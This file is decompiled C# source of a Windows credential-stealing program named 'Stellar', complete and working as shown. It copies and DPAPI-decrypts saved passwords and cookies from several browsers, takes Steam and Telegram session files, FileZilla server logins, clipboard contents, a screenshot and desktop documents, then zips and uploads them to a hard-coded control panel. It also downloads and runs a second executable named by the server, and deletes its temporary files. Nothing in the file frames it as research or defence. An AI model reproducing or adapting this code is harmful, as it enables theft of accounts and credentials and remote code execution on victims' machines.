using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.Win32;

namespace Stellar
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00001050
		[STAThread]
		private static void Main(string[] args)
		{
			if (Program.mozillaDir.Exists && Directory.Exists(Program.mozillaDir.FullName + Program.mozillaDir.GetDirectories()[0]))
			{
				Program.mozillaprofile = Program.mozillaDir.GetDirectories()[0].Name;
			}
			if (Directory.Exists(Program.cacheFolder))
			{
				try
				{
					Directory.Delete(Program.cacheFolder, true);
				}
				catch
				{
				}
			}
			if (File.Exists(Path.GetTempPath() + Program.StillerZipFileName))
			{
				try
				{
					File.Delete(Path.GetTempPath() + Program.StillerZipFileName);
				}
				catch
				{
				}
			}
			if (Directory.Exists(Program.filesFolder))
			{
				try
				{
					Directory.Delete(Program.filesFolder, true);
				}
				catch
				{
				}
			}
			Directory.CreateDirectory(Program.cacheFolder);
			Directory.CreateDirectory(Program.filesFolder);
			Directory.CreateDirectory(Program.cacheFolder + "Desktop");
			Directory.CreateDirectory(Program.cacheFolder + "Steam");
			Directory.CreateDirectory(Program.cacheFolder + "Telegram");
			Program.CopyInformationFromBrowsers();
			string text = null;
			string text2 = null;
			for (int i = 0; i < Program.pathPassowords.Length; i++)
			{
				int length = BrowsersData.Address.Count<string>();
				Program.GetPass(Program.pathPassowords[i][1]);
				text += Program.GettingPasswords(length);
			}
			for (int j = 0; j < Program.pathCookies.Length; j++)
			{
				text2 += Program.GetCookies(Program.pathCookies[j][1]);
			}
			text2 = "[" + text2.TrimEnd(new char[]
			{
				','
			}) + "]";
			File.WriteAllText(Program.cacheFolder + "cookies.json", text2);
			File.WriteAllText(Program.cacheFolder + "passwords.txt", text);
			File.WriteAllText(Program.cacheFolder + "SystemInfo.txt", Program.SystemInfo());
			Program.Screenshot();
			Program.SteamAuth();
			Program.TelegramAuth();
			Program.FileZilla();
			Program.Desktop();
			Program.Archive();
			string text3 = Program.SendToServer();
			if (text3 != "none")
			{
				if (text3 != "")
				{
					Program.Loader(text3);
					while (!Program.CloseProgram)
					{
						Thread.Sleep(2000);
					}
				}
				else
				{
					string text4 = Program.SendToServer();
					if (text4 != "none")
					{
						if (text4 != "")
						{
							Program.Loader(text4);
							while (!Program.CloseProgram)
							{
								Thread.Sleep(2000);
							}
						}
						else
						{
							Program.ClearLogs();
						}
					}
				}
			}
			Program.ClearLogs();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000230C File Offset: 0x0000130C
		private static void Loader(string loader)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile(loader, Program.filesFolder + "/loader.exe");
				}
				Process process = new Process();
				process.StartInfo.FileName = Program.filesFolder + "/loader.exe";
				process.StartInfo.UseShellExecute = true;
				process.EnableRaisingEvents = true;
				process.Start();
				process.Exited += delegate(object sender, EventArgs e)
				{
					Program.CloseProgram = true;
				};
			}
			catch
			{
				Program.CloseProgram = true;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000023C8 File Offset: 0x000013C8
		private static void ClearLogs()
		{
			for (int i = 0; i < 10; i++)
			{
				try
				{
					Directory.Delete(Program.cacheFolder, true);
					Directory.Delete(Program.filesFolder, true);
					break;
				}
				catch (IOException)
				{
					i++;
					Thread.Sleep(500);
				}
			}
			Program.TryFunction(new Program.function(File.Delete), Path.GetTempPath() + Program.StillerZipFileName, 10, 200);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002444 File Offset: 0x00001444
		private static void Archive()
		{
			try
			{
				using (ZipFile zipFile = new ZipFile(Path.GetTempPath() + Program.StillerZipFileName))
				{
					zipFile.AlternateEncoding = Encoding.UTF8;
					zipFile.AlternateEncodingUsage = 1;
					zipFile.AddDirectory(Program.cacheFolder);
					zipFile.Save();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000024B8 File Offset: 0x000014B8
		private static void Screenshot()
		{
			try
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				bitmap.Save(Program.cacheFolder + "Screenshot.png");
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002534 File Offset: 0x00001534
		private static void Desktop()
		{
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				DirectoryInfo directoryInfo = new DirectoryInfo(folderPath);
				List<string> list = new List<string>();
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					Path.GetExtension(fileInfo.FullName);
					if (Path.GetExtension(fileInfo.FullName) == ".doc" || Path.GetExtension(fileInfo.FullName) == ".docx" || Path.GetExtension(fileInfo.FullName) == ".txt" || Path.GetExtension(fileInfo.FullName) == ".log" || Path.GetExtension(fileInfo.FullName) == ".php" || Path.GetExtension(fileInfo.FullName) == ".html" || Path.GetExtension(fileInfo.FullName) == ".css" || Path.GetExtension(fileInfo.FullName) == ".js" || Path.GetExtension(fileInfo.FullName) == ".json" || Path.GetExtension(fileInfo.FullName) == ".mafile")
					{
						list.Add(fileInfo.FullName);
					}
					foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
					{
						foreach (FileInfo fileInfo2 in directoryInfo2.GetFiles())
						{
							if (Path.GetExtension(fileInfo2.FullName) == ".doc" || Path.GetExtension(fileInfo2.FullName) == ".docx" || Path.GetExtension(fileInfo2.FullName) == ".txt" || Path.GetExtension(fileInfo2.FullName) == ".log" || Path.GetExtension(fileInfo2.FullName) == ".php" || Path.GetExtension(fileInfo2.FullName) == ".html" || Path.GetExtension(fileInfo2.FullName) == ".css" || Path.GetExtension(fileInfo2.FullName) == ".js" || Path.GetExtension(fileInfo2.FullName) == ".json" || Path.GetExtension(fileInfo2.FullName) == ".mafile")
							{
								list.Add(fileInfo2.FullName);
							}
						}
						foreach (DirectoryInfo directoryInfo3 in directoryInfo2.GetDirectories())
						{
							foreach (FileInfo fileInfo3 in directoryInfo3.GetFiles())
							{
								if (Path.GetExtension(fileInfo.FullName) == ".doc" || Path.GetExtension(fileInfo3.FullName) == ".docx" || Path.GetExtension(fileInfo3.FullName) == ".txt" || Path.GetExtension(fileInfo3.FullName) == ".log" || Path.GetExtension(fileInfo3.FullName) == ".php" || Path.GetExtension(fileInfo3.FullName) == ".html" || Path.GetExtension(fileInfo3.FullName) == ".css" || Path.GetExtension(fileInfo3.FullName) == ".js" || Path.GetExtension(fileInfo3.FullName) == ".json" || Path.GetExtension(fileInfo3.FullName) == ".mafile")
								{
									list.Add(fileInfo3.FullName);
								}
							}
							foreach (DirectoryInfo directoryInfo4 in directoryInfo3.GetDirectories())
							{
								foreach (FileInfo fileInfo4 in directoryInfo4.GetFiles())
								{
									if (Path.GetExtension(fileInfo4.FullName) == ".doc" || Path.GetExtension(fileInfo4.FullName) == ".docx" || Path.GetExtension(fileInfo4.FullName) == ".txt" || Path.GetExtension(fileInfo4.FullName) == ".log" || Path.GetExtension(fileInfo4.FullName) == ".php" || Path.GetExtension(fileInfo4.FullName) == ".html" || Path.GetExtension(fileInfo4.FullName) == ".css" || Path.GetExtension(fileInfo4.FullName) == ".js" || Path.GetExtension(fileInfo4.FullName) == ".json" || Path.GetExtension(fileInfo4.FullName) == ".mafile")
									{
										list.Add(fileInfo4.FullName);
									}
								}
							}
						}
					}
				}
				foreach (string text in list)
				{
					try
					{
						string text2 = Program.cacheFolder + "Desktop\\" + text.Split(new string[]
						{
							folderPath
						}, StringSplitOptions.None)[1];
						text2 = text2.Substring(0, text2.LastIndexOf('\\') + 1);
						Directory.CreateDirectory(text2);
						File.Copy(text, text2 + Path.GetFileName(text), true);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002B74 File Offset: 0x00001B74
		private static string GettingPasswords(int length)
		{
			string result;
			try
			{
				string text = null;
				for (int i = length; i < BrowsersData.Address.Count; i++)
				{
					string text2 = text;
					text = string.Concat(new string[]
					{
						text2,
						BrowsersData.Address[i],
						"\r\n",
						BrowsersData.Login[i],
						":",
						BrowsersData.Password[i],
						"\r\n"
					});
				}
				result = text;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002C14 File Offset: 0x00001C14
		private static void CopyInformationFromBrowsers()
		{
			foreach (string array2 in Program.pathPassowords)
			{
				if (File.Exists(array2[0]))
				{
					try
					{
						File.Copy(array2[0], Program.filesFolder + array2[1]);
					}
					catch
					{
					}
				}
			}
			foreach (string array4 in Program.pathCookies)
			{
				if (File.Exists(array4[0]))
				{
					try
					{
						File.Copy(array4[0], Program.filesFolder + array4[1]);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002CC0 File Offset: 0x00001CC0
		private static string SendToServer()
		{
			string result;
			try
			{
				string text = "----------------------------" + DateTime.Now.Ticks.ToString("x");
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Program.getterSite);
				httpWebRequest.Method = "POST";
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.KeepAlive = true;
				httpWebRequest.Headers.Add(HttpRequestHeader.AcceptCharset, "utf-8");
				httpWebRequest.Headers.Add(HttpRequestHeader.AcceptLanguage, "ru");
				httpWebRequest.ContentType = "multipart/form-data; boundary=" + text;
				Stream stream = new MemoryStream();
				byte[] bytes = Encoding.UTF8.GetBytes("\r\n--" + text + "\r\n");
				string text2 = null;
				string format = "\r\n--" + text + "\r\nContent-Disposition:  form-data; name=\"{0}\";\r\n\r\n{1}";
				text2 += string.Format(format, "id", Program.idserver);
				text2 += string.Format(format, "hwid", Program.GetHWID());
				text2 += string.Format(format, "version", Program.ProgramVersion);
				int num = 0;
				for (int i = 0; i < BrowsersData.Address.Count; i++)
				{
					text2 += string.Format(format, "info[" + num + "]", BrowsersData.Address[i]);
					text2 += string.Format(format, "info[" + (num + 1) + "]", BrowsersData.Login[i]);
					text2 += string.Format(format, "info[" + (num + 2) + "]", BrowsersData.Password[i]);
					num += 3;
				}
				text2 += string.Format(format, "cookiescount", BrowsersData.CookiesCount);
				text2 += string.Format(format, "steam", BrowsersData.Steam);
				text2 += string.Format(format, "telegram", BrowsersData.Telegram);
				text2 += string.Format(format, "user", Environment.UserName);
				text2 += string.Format(format, "pc", Environment.MachineName);
				text2 = text2 + "\r\n--" + text + "\r\n";
				byte[] bytes2 = Encoding.UTF8.GetBytes(text2);
				stream.Write(bytes2, 0, bytes2.Length);
				string format2 = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\n Content-Type: application/zip, application/octet-stream\r\n\r\n";
				stream.Write(bytes, 0, bytes.Length);
				string s = string.Format(format2, "file", Path.GetTempPath() + Program.StillerZipFileName);
				byte[] bytes3 = Encoding.UTF8.GetBytes(s);
				stream.Write(bytes3, 0, bytes3.Length);
				FileStream fileStream = new FileStream(Path.GetTempPath() + Program.StillerZipFileName, FileMode.Open, FileAccess.Read);
				byte[] array = new byte[1024];
				int count;
				while ((count = fileStream.Read(array, 0, array.Length)) != 0)
				{
					stream.Write(array, 0, count);
				}
				stream.Write(bytes, 0, bytes.Length);
				fileStream.Close();
				httpWebRequest.ContentLength = stream.Length;
				Stream requestStream = httpWebRequest.GetRequestStream();
				stream.Position = 0L;
				byte[] array2 = new byte[stream.Length];
				stream.Read(array2, 0, array2.Length);
				stream.Close();
				requestStream.Write(array2, 0, array2.Length);
				requestStream.Close();
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					try
					{
						Stream responseStream = httpWebResponse.GetResponseStream();
						StreamReader streamReader = new StreamReader(responseStream, Encoding.UTF8);
						char[] array3 = new char[256];
						int j = streamReader.Read(array3, 0, 256);
						string text3 = string.Empty;
						while (j > 0)
						{
							string str = new string(array3, 0, j);
							text3 += str;
							j = streamReader.Read(array3, 0, 256);
						}
						result = text3;
					}
					catch
					{
						result = "";
					}
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000313C File Offset: 0x0000213C
		private static string GetHWID()
		{
			string str = "";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementBaseObject managementBaseObject = enumerator.Current;
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					str = (string)managementObject["ProcessorId"];
				}
			}
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\");
			string str2 = (string)registryKey.GetValue("ProductName");
			registryKey.Close();
			string result;
			using (MD5 md = MD5.Create())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(str2 + str);
				byte[] array = md.ComputeHash(bytes);
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < array.Length; i++)
				{
					stringBuilder.Append(array[i].ToString("X2"));
				}
				result = stringBuilder.ToString();
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00003278 File Offset: 0x00002278
		private static string SystemInfo()
		{
			string result;
			try
			{
				string text = null;
				text += "--Windows Information--\r\n";
				text = text + "PC: " + Environment.MachineName + "\r\n";
				text = text + "User: " + Environment.UserName + "\r\n";
				text = text + "Clipboard: \"" + Clipboard.GetText() + "\"\r\n";
				text = text + "Windows OS: " + (from x in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().OfType<ManagementObject>()
				select x.GetPropertyValue("Caption")).First<object>().ToString() + "\r\n";
				string text2 = text;
				text = string.Concat(new string[]
				{
					text2,
					"The expansion of the screen: ",
					Screen.PrimaryScreen.Bounds.Size.Width.ToString(),
					"x",
					Screen.PrimaryScreen.Bounds.Size.Height.ToString(),
					"\r\n\r\n"
				});
				DriveInfo[] drives = DriveInfo.GetDrives();
				text += "---Disk info---\r\n";
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						object obj = text;
						text = string.Concat(new object[]
						{
							obj,
							"   --Имя ",
							driveInfo.Name,
							"--\r\n     Свободное пространство: ",
							driveInfo.AvailableFreeSpace / 1024L / 1024L / 1024L,
							" Gb\r\n     Общий размер: ",
							driveInfo.TotalSize,
							"\r\n     Формат устройства: ",
							driveInfo.DriveFormat,
							"\r\n     Тип устройства: ",
							driveInfo.DriveType,
							"\r\n     Готовность: ",
							driveInfo.IsReady,
							"\r\n     Корневой каталог: ",
							driveInfo.RootDirectory,
							"\r\n     Метка тома: ",
							driveInfo.VolumeLabel,
							"\r\n\r\n"
						});
					}
					catch
					{
					}
				}
				text += "\r\n";
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
				text += "---GPU Info--\r\n";
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj2 = text;
					text = string.Concat(new object[]
					{
						obj2,
						"Name  -  ",
						managementObject["Name"],
						"\r\nVideoProcessor  -  ",
						managementObject["VideoProcessor"],
						"\r\n\r\n"
					});
				}
				ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
				text += "--CPU Info--\r\n";
				foreach (ManagementBaseObject managementBaseObject2 in managementObjectSearcher2.Get())
				{
					ManagementObject managementObject2 = (ManagementObject)managementBaseObject2;
					object obj3 = text;
					text = string.Concat(new object[]
					{
						obj3,
						"Name: ",
						managementObject2["Name"],
						"\r\nNumberOfCores: ",
						managementObject2["NumberOfCores"],
						"\r\n\r\n"
					});
				}
				result = text;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000369C File Offset: 0x0000269C
		private static void FileZilla()
		{
			try
			{
				string str = "C:/Users/" + Environment.UserName + "\\";
				string text = str + "\\AppData\\Roaming\\FileZilla\\";
				if (Directory.Exists(text) && File.Exists(text + "sitemanager.xml"))
				{
					Directory.CreateDirectory(Program.cacheFolder + "FileZilla");
					File.Copy(text + "sitemanager.xml", Program.cacheFolder + "FileZilla\\sitemanager.xml");
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00003730 File Offset: 0x00002730
		private static void TelegramAuth()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
				string text = (string)registryKey.GetValue(null);
				registryKey.Close();
				text = text.Remove(text.LastIndexOf('\\') + 1);
				string text2 = text.Replace('"', ' ') + "tdata\\";
				foreach (string text3 in Directory.GetFiles(text2))
				{
					if (text3.Contains("D877F783D5D3EF8C"))
					{
						File.Copy(text3, Program.cacheFolder + "Telegram/" + Path.GetFileName(text3));
						BrowsersData.Telegram = 1;
					}
				}
				foreach (string text4 in Directory.GetFiles(text2 + "D877F783D5D3EF8C"))
				{
					if (text4.Contains("map"))
					{
						File.Copy(text4, Program.cacheFolder + "Telegram/" + Path.GetFileName(text4));
						BrowsersData.Telegram = 1;
					}
				}
			}
			catch
			{
				BrowsersData.Telegram = 0;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00003850 File Offset: 0x00002850
		private static void SteamAuth()
		{
			try
			{
				string steamDir = Program.GetSteamDir();
				string path = steamDir + "config\\";
				List<string> list = new List<string>();
				foreach (string text in Directory.GetFiles(steamDir))
				{
					if (text.Contains("ssfn"))
					{
						list.Add(text);
					}
				}
				string str = Program.cacheFolder + "Steam\\";
				foreach (string text2 in Directory.GetFiles(path))
				{
					try
					{
						string fileName = Path.GetFileName(text2);
						string destFileName = str + fileName;
						File.Copy(text2, destFileName, true);
					}
					catch
					{
					}
				}
				foreach (string text3 in list)
				{
					try
					{
						string fileName2 = Path.GetFileName(text3);
						string destFileName2 = str + fileName2;
						File.Copy(text3, destFileName2, true);
					}
					catch
					{
					}
				}
				BrowsersData.Steam = 1;
			}
			catch
			{
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00003990 File Offset: 0x00002990
		private static string GetSteamDir()
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\steam\\Shell\\Open\\Command");
				string text = (string)registryKey.GetValue(null);
				registryKey.Close();
				text = text.Remove(text.LastIndexOf('\\') + 1);
				result = text.Replace('"', ' ');
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000039F4 File Offset: 0x000029F4
		private static string GetCookies(string name)
		{
			string text = Program.filesFolder + name;
			int num = 0;
			if (File.Exists(text))
			{
				if (name.Contains("Moz"))
				{
					try
					{
						string tableName = "moz_cookies";
						SqlHandler sqlHandler = new SqlHandler(text);
						sqlHandler.ReadTable(tableName);
						int rowCount = sqlHandler.GetRowCount();
						Program.TryFunction(new Program.function(File.Delete), text, 10, 200);
						string text2 = "";
						for (int i = 0; i < rowCount; i++)
						{
							string text3 = sqlHandler.GetValue(i, 4).ToString();
							string text4;
							if (sqlHandler.GetValue(i, 11).ToString() == "false")
							{
								text4 = "false";
							}
							else
							{
								text4 = "true";
							}
							string text5;
							if (sqlHandler.GetValue(i, 10).ToString() == "false")
							{
								text5 = "false";
							}
							else
							{
								text5 = "true";
							}
							if (text3 != "")
							{
								if (text3.Contains("\""))
								{
									text3 = text3.Replace("\"", "");
								}
								if (!text3.Contains("\\"))
								{
									string text6 = text2;
									text2 = string.Concat(new string[]
									{
										text6,
										"{\"domain\":\"",
										sqlHandler.GetValue(i, 5),
										"\",\"expirationDate\":",
										sqlHandler.GetValue(i, 7),
										",\"hostOnly\":false,\"httpOnly\":",
										text4,
										",\"name\":\"",
										sqlHandler.GetValue(i, 3),
										"\",\"path\":\"",
										sqlHandler.GetValue(i, 6),
										"\",\"sameSite\":null,\"secure\":",
										text5,
										",\"session\":false,\"storeId\":null,\"value\":\"",
										text3,
										"\",\"id\":1},"
									});
									num++;
								}
							}
						}
						BrowsersData.CookiesCount += num;
						return text2;
					}
					catch
					{
						return "";
					}
				}
				try
				{
					string tableName2 = "cookies";
					byte[] entropyBytes = null;
					SqlHandler sqlHandler2 = new SqlHandler(text);
					sqlHandler2.ReadTable(tableName2);
					int rowCount2 = sqlHandler2.GetRowCount();
					Program.TryFunction(new Program.function(File.Delete), text, 10, 200);
					string text7 = "";
					for (int j = 0; j < rowCount2; j++)
					{
						byte[] bytes = Encoding.Default.GetBytes(sqlHandler2.GetValue(j, 12));
						string text8;
						byte[] bytes2 = DPAPI.Decrypt(bytes, entropyBytes, out text8);
						string text9 = new UTF8Encoding(true).GetString(bytes2);
						string text10;
						if (sqlHandler2.GetValue(j, 7).ToString() == "false")
						{
							text10 = "false";
						}
						else
						{
							text10 = "true";
						}
						string text11;
						if (sqlHandler2.GetValue(j, 6).ToString() == "false")
						{
							text11 = "false";
						}
						else
						{
							text11 = "true";
						}
						if (text9 != "")
						{
							if (text9.Contains("\""))
							{
								text9 = text9.Replace("\"", "");
							}
							if (!text9.Contains("\\"))
							{
								string text12 = text7;
								text7 = string.Concat(new string[]
								{
									text12,
									"{\"domain\":\"",
									sqlHandler2.GetValue(j, 1),
									"\",\"expirationDate\":",
									sqlHandler2.GetValue(j, 5),
									",\"hostOnly\":false,\"httpOnly\":",
									text10,
									",\"name\":\"",
									sqlHandler2.GetValue(j, 2),
									"\",\"path\":\"",
									sqlHandler2.GetValue(j, 4),
									"\",\"sameSite\":null,\"secure\":",
									text11,
									",\"session\":false,\"storeId\":null,\"value\":\"",
									text9,
									"\",\"id\":",
									sqlHandler2.GetValue(j, 11),
									"},"
								});
								num++;
							}
						}
					}
					BrowsersData.CookiesCount += num;
					return text7;
				}
				catch
				{
					return "";
				}
			}
			return "";
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00003E54 File Offset: 0x00002E54
		private static bool TryFunction(Program.function func, string argument, int count, int sleep)
		{
			for (int i = 0; i < count; i++)
			{
				try
				{
					func(argument);
					return true;
				}
				catch
				{
					Thread.Sleep(sleep);
				}
			}
			return false;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00003E94 File Offset: 0x00002E94
		private static void GetPass(string name)
		{
			string text = Program.filesFolder + name;
			if (File.Exists(text))
			{
				string tableName = "logins";
				byte[] entropyBytes = null;
				SqlHandler sqlHandler = new SqlHandler(text);
				sqlHandler.ReadTable(tableName);
				int rowCount = sqlHandler.GetRowCount();
				for (int i = 0; i < rowCount; i++)
				{
					string text2;
					byte[] bytes = DPAPI.Decrypt(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 5)), entropyBytes, out text2);
					string @string = new UTF8Encoding(true).GetString(bytes);
					string text3 = sqlHandler.GetValue(i, 0).ToString();
					string text4 = sqlHandler.GetValue(i, 3).ToString();
					bool flag = false;
					if (text4.Length != 0 && @string.Length != 0)
					{
						foreach (string a in BrowsersData.Address)
						{
							if (a == text3)
							{
								using (List<string>.Enumerator enumerator2 = BrowsersData.Login.GetEnumerator())
								{
									while (enumerator2.MoveNext())
									{
										string a2 = enumerator2.Current;
										if (a2 == text4)
										{
											using (List<string>.Enumerator enumerator3 = BrowsersData.Password.GetEnumerator())
											{
												while (enumerator3.MoveNext())
												{
													string a3 = enumerator3.Current;
													if (a3 == @string)
													{
														flag = true;
														break;
													}
												}
												break;
											}
										}
									}
									break;
								}
							}
						}
						if (!flag)
						{
							BrowsersData.Address.Add(text3);
							BrowsersData.Login.Add(text4);
							BrowsersData.Password.Add(@string);
						}
					}
				}
			}
		}

		// Token: 0x04000001 RID: 1
		private static string filesFolder = Path.GetTempPath() + "Stellar_log\\";

		// Token: 0x04000002 RID: 2
		private static string cacheFolder = Path.GetTempPath() + "Stellar\\";

		// Token: 0x04000003 RID: 3
		private static string getterSite = "https://stellarpanel.ru/getter";

		// Token: 0x04000004 RID: 4
		private static string StillerZipFileName = "Data.zip";

		// Token: 0x04000005 RID: 5
		private static string ProgramVersion = "1.0";

		// Token: 0x04000006 RID: 6
		private static string idserver = "";

		// Token: 0x04000007 RID: 7
		private static DirectoryInfo mozillaDir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\");

		// Token: 0x04000008 RID: 8
		private static string mozillaprofile = "";

		// Token: 0x04000009 RID: 9
		private static string[][] pathPassowords = new string[][]
		{
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				"ChromePass"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data",
				"ChromiumPass"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Login Data",
				"OrbitumPass"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi\\User Data\\Default\\Login Data",
				"VivaldiPass"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User Data\\Default\\Login Data",
				"AmigoPass"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				"OperaPass"
			}
		};

		// Token: 0x0400000A RID: 10
		private static string[][] pathCookies = new string[][]
		{
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
				"YandexCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				"ChromeCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Cookies",
				"ChromiumCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Cookies",
				"OrbitumCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi\\User Data\\Default\\Cookies",
				"VivaldiCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User Data\\Default\\Cookies",
				"AmigoCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				"OperaCookies"
			},
			new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\" + Program.mozillaprofile + "\\cookies.sqlite",
				"MozillaCookies"
			}
		};

		// Token: 0x0400000B RID: 11
		private static bool CloseProgram = false;

		// Token: 0x02000003 RID: 3
		// (Invoke) Token: 0x06000018 RID: 24
		private delegate void function(string str);
	}
}
